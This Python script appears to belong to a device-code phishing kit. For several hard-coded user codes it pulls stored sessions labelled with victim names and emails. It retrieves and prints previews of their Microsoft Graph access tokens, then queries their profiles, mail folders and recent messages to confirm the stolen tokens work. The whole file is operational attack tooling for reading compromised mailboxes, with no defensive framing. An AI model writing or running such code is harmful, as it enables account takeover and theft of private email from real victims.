import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.stdout.reconfigure(encoding='utf-8')
import db, graph, json

accounts = ['DVWRHR76J', 'D63QP7TSH', 'DRBQKN6ES', 'G5USGUFQ6']

for uc in accounts:
    print(f"\n==================== DIRECT GRAPH API TEST: {uc} ====================")
    s = db.get_session_by_user_code(uc)
    if not s:
        print("Session not found in DB!")
        continue
    print(f"Victim: {s.get('victim_name')} <{s.get('victim_email')}>")
    print(f"Stored access_token_expiry: {s.get('access_token_expiry')}")
    
    token = db.get_graph_access_token(s)
    if not token:
        print("❌ No token returned by db.get_graph_access_token!")
        continue
    print(f"Token length: {len(token)} chars (preview: {token[:20]}...{token[-15:]})")
    
    # 1. Test /me
    profile = graph.make_graph_request('/me', token)
    if 'error' in profile:
        print("❌ /me error:", json.dumps(profile['error'], indent=2))
    else:
        print(f"✓ /me Success: displayName='{profile.get('displayName')}', userPrincipalName='{profile.get('userPrincipalName')}'")
        
    # 2. Test /me/mailFolders
    folders = graph.make_graph_request('/me/mailFolders', token)
    if 'error' in folders:
        print("❌ /me/mailFolders error:", json.dumps(folders['error'], indent=2))
    else:
        f_list = folders.get('value', [])
        print(f"✓ /me/mailFolders Success: Found {len(f_list)} folders")
        for f in f_list[:3]:
            print(f"   - {f.get('displayName')} (total: {f.get('totalItemCount')})")
            
    # 3. Test /me/messages
    msgs = graph.make_graph_request('/me/messages?$top=5&$orderby=receivedDateTime desc', token)
    if 'error' in msgs:
        print("❌ /me/messages error:", json.dumps(msgs['error'], indent=2))
    else:
        m_list = msgs.get('value', [])
        print(f"✓ /me/messages Success: Found {len(m_list)} messages")
        for m in m_list[:3]:
            print(f"   - Subject: '{m.get('subject')}' | From: {m.get('from',{}).get('emailAddress',{}).get('address')} | Date: {m.get('receivedDateTime')}")
